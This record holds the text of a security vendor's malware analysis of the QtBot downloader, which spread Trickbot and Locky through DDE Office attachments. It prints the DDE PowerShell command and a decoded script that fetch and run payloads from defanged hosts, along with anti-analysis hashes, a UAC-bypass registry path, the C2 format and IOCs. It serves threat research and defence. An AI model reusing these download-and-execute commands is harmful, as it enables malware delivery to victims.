{
    "id": "03edb868-e869-4eea-836e-6e2ba5b877cf",
    "created_at": "2023-01-12T15:02:00.685791Z",
    "updated_at": "2025-03-27T02:06:14.939672Z",
    "deleted_at": null,
    "sha1_hash": "6da732316489418a93a1f415b1f84d53a0dc143b",
    "title": "2017-11-01 - Everybody Gets One- QtBot Used to Distribute Trickbot and Locky",
    "authors": "",
    "file_creation_date": "2022-05-28T15:12:02Z",
    "file_modification_date": "2022-05-28T15:12:02Z",
    "file_size": 1853852,
    "plain_text": "# Everybody Gets One: QtBot Used to Distribute Trickbot and Locky\n\n**[researchcenter.paloaltonetworks.com/2017/11/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky/](https://researchcenter.paloaltonetworks.com/2017/11/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky/)**\n\nBrandon Levene, Brandon Young, Dominik Reichel November 1, 2017\n\nBy [Brandon Levene,](https://unit42.paloaltonetworks.com/author/brandon-levene/) [Brandon Young and](https://unit42.paloaltonetworks.com/author/brandon-young/) [Dominik Reichel](https://unit42.paloaltonetworks.com/author/dominik-reichel/)\n\nNovember 1, 2017 at 1:00 PM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [Locky,](https://unit42.paloaltonetworks.com/tag/locky/) [QtBot,](https://unit42.paloaltonetworks.com/tag/qtbot/) [Trickbot](https://unit42.paloaltonetworks.com/tag/trickbot/)\n\nIntroduction\n\nThe most common Locky and Trickbot affiliates are being distributed via shared malspam campaigns. Unit\n42 and external malware researchers believe the payloads are geo-targeted. Previously, geo-targeting was\n[controlled by a relatively simplistic VBA script which utilized GeoIP lookup services and parsed the country](https://phishme.com/locky-trickbot-depends-malicious-payload-delivery-tailored-geographic-location/)\ncode to determine the compromised host’s location. With this information, the VBA script would enter a loop\nchecking for the presence of the country codes: UK, IE, AU, GB, LU, or BE and, if any of those country\ncodes was present, URIs to serve Trickbot were selected for download and execution. If this check failed,\nLocky would be served instead.\n\nRecently, [Unit 42 researcher Brad Duncan observed](https://blog.paloaltonetworks.com/author/bduncan/) [Necurs malspam campaigns distributing Microsoft](https://isc.sans.edu/forums/diary/Necurs+Botnet+malspam+pushes+Locky+using+DDE+attack/22946/))\n[Office documents that were abusing DDE. These documents load an intermediate downloader which we](https://www.bleepingcomputer.com/news/security/microsoft-office-attack-runs-malware-without-needing-macros/)\nhave tagged in AutoFocus as “QtBot”. QtBot replaces the previously discussed VBA and features a robust\nanti-analysis suite to protect itself. This new downloader is responsible for loading the final payload, either\nLocky or Trickbot, again based on GeoIP. Palo Alto Networks has observed more than 4 million unique\nsessions with QtBot activity since October 19, 2017.th\n\nThe Lure\n\n[The malicious DDE documents are included as attachments to malspam lures like the one below (seen](https://isc.sans.edu/diary/Macro-less+Code+Execution+in+MS+Word/22970)\n10/24/2017):\n\n\n-----\n\n_Figure 1. Shows an example email lure with a malicious document that uses DDE to deliver a payload._\n\nTypically, these lures are very simple. Most of the observed lures fall either within the “Financial Statement”\ncategory (Invoice, Billing, Receipt) or “File Transfer” category (efax, file scan). This campaign relies on the\nuser to download the attachment, open it, and click through several dialog boxes. The attached document,\nbb92218314ffdc450320f1d44d8a2fe163c585827d9ca3e9a00cb2ea0e27f0c9, contains the following DDE\nobject:\n\n[URL Defanged]\n\n\n1\n2\n3\n4\n\n\nDDEAUTO C:\\\\Windows\\\\System32\\\\cmd.exe \"/k powershell.exe -NonI noexit -NoP -sta $sr=(new-object IO.StreamReader\n((([Net.WebRequest]::Create('hXXp://burka.ch/JHhdg33')).GetResponse())\n.GetResponseStream())).ReadToEnd();powershell.exe -e $sr\"\n\n\nNetwork Traffic\n\nLet’s examine the network traffic. Immediately following the user’s click-throughs of three dialog boxes, the\nfollowing HTTP GET request is issued. Interestingly, its likely this initial command and control server is\nsimply a compromised webhost running a vulnerable version of PLESK as can be seen by the X-PoweredBy header in the HTTP response.\n\n\n-----\n\n_Figure 2. DDE downloads a base64 blob for execution. Also, an interesting note: this initial server hosting the_\n_scriptlet is using PLESK and is likely compromised._\n\nThe base64 blob decodes to the following [URLs defanged]:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n$urls = \"hXXp://aureaart[.]ru/incrHG32\",\"hXXp://castellodimontegioco[.]com/incrHG32\",\"hXXp:\n//nl.flipcapella[.]com/incrHG32\",\"hXXp://dotecnia[.]cl/incrHG32\",\"hXXp\n://christakranzl[.]at/incrHG32\"\nforeach($url in $urls){\nTry\n{\nWrite-Host $url\n$fp = \"$env:temp\\theyweare64.exe\"\nWrite-Host $fp\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $fp)\nStart-Process $fp\nbreak\n}\nCatch\n{\nWrite-Host $_.Exception.Message\n}\n}\n\n\nThe entire list is iterated over until a valid download location is found (this can be observed in the cmd.exe\nwindow which is spawned in the background by the initial DDE execution). Once a live command and control\nserver responds, the QtBot binary\n(798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120) is downloaded in the clear.\n\n\n-----\n\n_Figure 3. Download of the QtBot downloader, with the executable in the clear. Note that the Content-Type_\n_doesn’t match._\n\nOnce the QtBot binary has been downloaded, its executed from the user’s %temp% directory using the\nPowerShell directive Start-Process which can be seen in the decoded base64 blob included in the code\nblock above. When QtBot is started, it initially performs a connectivity check to the legitimate domain,\nds.download.windowsupdate[.]com, via an HTTP POST request.\n\n\n-----\n\n_Figure 4. Downloader component issues a request to an innocuous domain as a connectivity check._\n\nFinally, once the connectivity check passes, QtBot will beacon back to its command and control server using\nan HTTP POST request with an RC4 encrypted payload and await a response which is encrypted with the\nsame RC4 key. The User-Agent “Windows-Update-Agent” in the connectivity check, initial check-in, and final\npayload delivery are all identical.\n\nFor the network traffic below, we will use the QtBot sample,\nd97be402740f6a0fc70c90751f499943bf26f7c00791d46432889f1bedf9dbd2, as at the time of analysis the\ncommand and control server was still live and serving geo specific payloads.\n\nIn cases where the geolocation matches a set list (we believe this list is likely identical to the earlier VBA\ndiscussed in the Introduction section), we will see the traffic below.\n\n\n-----\n\n_Figure 5. The downloader Trojan posts data back to the command and control server. This likely determines_\n_geolocation based targeting, this request led to the download of Trickbot as we used a UK based exit point._\n_Trickbot download can be seen in Figure 6. Note the user-agent header is identical to that of the connectivity_\n_check in Figure 4._\n\nDue to the host being within the UK, we received an encrypted Trickbot payload. The decrypted Trickbot\nobserved in the request below is\n4fcee2679cc65585cc1c1c7baa020ec262a2b7fb9b8dc7529a8f73fab029afad.\n\n\n-----\n\n_Figure 6. Payload downloaded by the intermediate downloader. In this case, Trickbot._\n\nIn the following figures, we see a host POST data back to the C2 and receive a slightly different response.\nThis is because the host is in a location not specifically targeted for Trickbot delivery. Thus, we expect to see\na different download location and likely a Locky payload.\n\n\n-----\n\n_Figure 7. The downloader Trojan posts data back to the command and control server. This likely determines_\n_geolocation based targeting, this request led to the download of Locky as we used a CA based exit point._\n_Locky download can be seen in Figure 8._\n\nBelow we see a different payload from a different location due to the server’s response. In this case the\npayload is an encrypted Locky binary. This decrypted binary is\n9d2ce15fd9112d52fa09c543527ef0b5bf07eb4c07794931c5768e403c167d49.\n\n_Figure 8. Payload downloaded by the intermediate downloader. In this case, Locky._\n\nWith the network behavior laid out from initial execution to payload delivery, lets take a closer look at the\nintermediate downloader, QtBot.\n\nQtBot Analysis\n\nThe QtBot downloader is a Windows executable file that decrypts an importless stub into memory. This\npayload is later injected into msiexec.exe using common techniques. The payload then decrypts the second\nstage shellcode and injects it into a newly spawned svchost.exe process. This svchost.exe acts as the\nhandler for the final payload.\n\nWhen QtBot initially executes, a new thread is created which is responsible for process scanning. This\nprocess scanning is used to identify analysis tools and, if any are found, terminate the malware’s further\nexecution. This check is periodically repeated on a loop. Process hashes are calculated by lower casing the\nprocess name, calculating the crc32 of the result, and XORing the crc32 value with 0x2e5d47c8. The XOR\nvalue appears to change on a regular basis, thus the hashes below only apply to\n798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120. The following hash values\nare checked against running processes:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n0x171AF567\n0xB713B22E\n0x59F3573F - wireshark.exe\n0xA9275283 - peid.exe\n0x2C533BA3\n0xB1FDD418 - x64dbg.exe\n0xA7B71C08\n0x5BBA66D5\n0xFD62D761\n0xB01C9DA9 - cff explorer.exe\n0xE7AC4C20\n0x8718A391 - procexp.exe\n0x817D523A - ollydbg.exe\n0x9A65393D - lordpe.exe\n0x4B1B38C6 - processhacker.exe\n0xBD46C402\n0x72472F0B - tcpview.exe\n0x151648CD\n0x4A694A06 - vboxservice.exe\n0x956511A3 - sbiesvc.exe\n0x09D19890 - vmtoolsd.exe\n0x70383CD2\n0x40C795F0 - petools.exe\n0x6D2607D8 - exeinfope.exe\n0x4D9803BC - vboxtray.exe\n0x29FBEE3C - windbg.exe\n0x0872D0FC\n0x28F7E9A8 - idaq.exe\n0x3D0598D0 - x32dbg.exe\n0x1D141E5D\n0xFCB2810C - python.exe\n0x2AA827DB\n0xCA9B2CDE\n0x75F4F636 - procmon.exe\n\n\nThe payload then creates randomly generated numerical mutex along with the registry key\n“HKCU\\Software\\QtProject”. This registry key has been used in the past by legitimate Qt framework software\nand is not strictly to be considered malicious on its own.\n\nOnce the mutex and registry string are created, the malware uses RC4 with a hardcoded key to decrypt\nnumerous strings which are reproduced below (note these strings are from\n798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120):\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\ncmd.exe\nSoftware\\Microsoft\\Windows\\CurrentVersion\nboom\nhttp://toundlefa[.]net/\nSoftware\\QtProject\nmsiexec.exe\nsvchost.exe\n/c start %s && exit\ncmd.exe\n\\System32\\CompMgmtLauncher.exe\nrunas\nSoftware\\Classes\\mscfile\n\\shell\\open\\command\ntmp_file\nSoftware\\Microsoft\\Windows\\CurrentVersion\n\\Policies\\Explorer\n\\Run\nCheck Update\nPOST\nContent-Type: application/octet-stream\nConnection: close\nDZCW\n6VK3\nregsvr32.exe\nhttp://ds.download.windowsupdate.com/\n{\"rep\":0,\"bid\":\"%s\",\"ver\":%d,\"cam\":\"%s\",\"cis\":%d,\"lvl\":%d,\"adm\":%d,\"bit\":%d,\"osv\":%d,\"osb\":%d,\"tmt\":%d}\n{\"rep\":1,\"bid\":\"%s\",\"tid\":\"%s\",\"res\":%d}\n\n\nThe hardcoded RC4 Key,\n0x7A3C5B7CB7FCE715702AA0F4F4EC0935E759FD3B7B6BCC70159D61CF42814B81, is reused\nthroughout this campaign to encrypt and decrypt network communications.\n\nQtBot includes a function which checks for the keyboard layouts common to former USSR countries, if any\nare found, execution is terminated. This routine is shown below:\n\n_Figure 9. Keyboard layout checks in order to prevent infection of former USSR countries._\n\n\n-----\n\nFor persistence, a temp file is generated with a randomly generated name and stored in\n%APPDATA%\\Local\\Temp\\ in a randomly named folder.\nThis randomly generated value is used for the folder name and is stored in the registry key\n“HKCU\\Software\\QtProject” in the value “0FAD2D5E”. The malware stores additional encrypted data in this\nkey:\n“0FAD2D5E” – Random Value + Unicode temp file name + length of data blob\n“0FAD2D5EDZCW” – RC4 Encrypted C2 Domain\nSuccessful malware communications use a format string like the one below:\n\n\n1\n2\n\n\n{\"rep\":0,\"bid\":\"%s\",\"ver\":%d,\"cam\":\"%s\",\"cis\":%d,\"lvl\":%d,\"adm\":%d,\"bit\":%d,\"osv\":%d,\"osb\":\n%d,\"tmt\":%d}\n\n\nWhen this is filled in, it would look similar to the following:\n\n\n1\n2\n\n\n{\"rep\":0,\"bid\":\"LD0fJMblnCbrDT8Mvma4Rg==\",\"ver\":256,\"cam\":\"nightboom\",\"cis\":0,\"lvl\":1228\n8,\"adm\":1,\"bit\":1,\"osv\":1537,\"osb\":7601,\"tmt\":30}\n\n\nSome of these values are unknown, though we are able to speculate the nature of their meanings. We\nbelieve they are as follows:\n\"rep\" – communication attempt repetitions from a single host\n\"bid\" – binary identification; this value is stored in registry value \"0FAD2D5E\" and is RC4\nencrypted and base64 encoded before sending\n\"ver\" – likely versioning information\n\"cam\" – campaign name\n\"cis\" – unknown hardcoded value\n\"lvl\" – system integrity level\n\"adm\" – if the malware has administrative privileges\n\"bit\" – unknown\n\"osv\" – operating system version\n\"osb\" – operating system build\n\"tmt\" – timeout in seconds\n\nSimilarities to Andromeda\n[Existing analysis of the Andromeda loader and bot reveals some commonalities between Andromeda and](https://blog.avast.com/andromeda-under-the-microscope)\nQtBot. The most apparent similarities of these two families are the running process hash check used for\nanti-analysis, host infection denylisting based on language identifiers returned from GetKeyboardLayout,\nseparate infection and task reports for C2 reporting, and code injection target, msiexec.exe. At this time due\nto the seemingly major updates to the base Andromeda, which is still active, we are referring to this\nparticular family as a new entity and have created a separate identifier in Autofocus, QtBot, to help users\ndifferentiate.\n\nConclusion\nWhile geographic location specific malware delivery is not a new phenomenon, the combination of two\npreviously disparate malware family affiliates utilizing unified malspam campaigns and droppers is an\ninteresting shift in tactics. QtBot protects itself and the decision tree by which targeting is established and\noffers a significantly more robust anti-analysis package to stymie analysts.\nPalo Alto Networks has observed more than 4 million unique sessions with QtBot behaviors which can be\nseen with the [QtBot tag in AutoFocus. Customers using Wildfire are protected from this threat.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.QtBot)\nPalo Alto Networks would like to thank researchers at Proofpoint, who identifies this threat as \"QtLoader\", for\nfirst bringing these campaigns to our attention\n\n\n-----\n\nIOCs\n798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120 – QtBot\nd97be402740f6a0fc70c90751f499943bf26f7c00791d46432889f1bedf9dbd2 – QtBot used for payload\ndifferentiation screenshots\nbb92218314ffdc450320f1d44d8a2fe163c585827d9ca3e9a00cb2ea0e27f0c9 – DDE Dropper\n9d2ce15fd9112d52fa09c543527ef0b5bf07eb4c07794931c5768e403c167d49 – Locky\n4fcee2679cc65585cc1c1c7baa020ec262a2b7fb9b8dc7529a8f73fab029afad – Trickbot\nhXXp://hobystube[.]net – Locky Download Location\nhXXp://kengray[.]com – Trickbot Download Location\nhXXp://fetchstats[.]net – QtBot C2\nhXXp://toundlefa[.]net – QtBot C2\nhXXp://aurea-art[.]ru/incrHG32\nhXXp://castellodimontegioco[.]com/incrHG32\nhXXp://nl.flipcapella[.]com/incrHG32\nhXXp://dotecnia[.]cl/incrHG32\nhXXp://christakranzl[.]at/incrHG32\nhXXp://burka[.]ch/JHhdg33\nhXXp://celebrityonline[.]cz – URI varies based on payload\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-11-01 - Everybody Gets One- QtBot Used to Distribute Trickbot and Locky.pdf"
    ],
    "report_names": [
        "2017-11-01 - Everybody Gets One- QtBot Used to Distribute Trickbot and Locky.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535720,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653750722,
    "ts_modification_date": 1653750722,
    "files": {
        "pdf": "https://archive.orkl.eu/6da732316489418a93a1f415b1f84d53a0dc143b.pdf",
        "text": "https://archive.orkl.eu/6da732316489418a93a1f415b1f84d53a0dc143b.txt",
        "img": "https://archive.orkl.eu/6da732316489418a93a1f415b1f84d53a0dc143b.jpg"
    }
}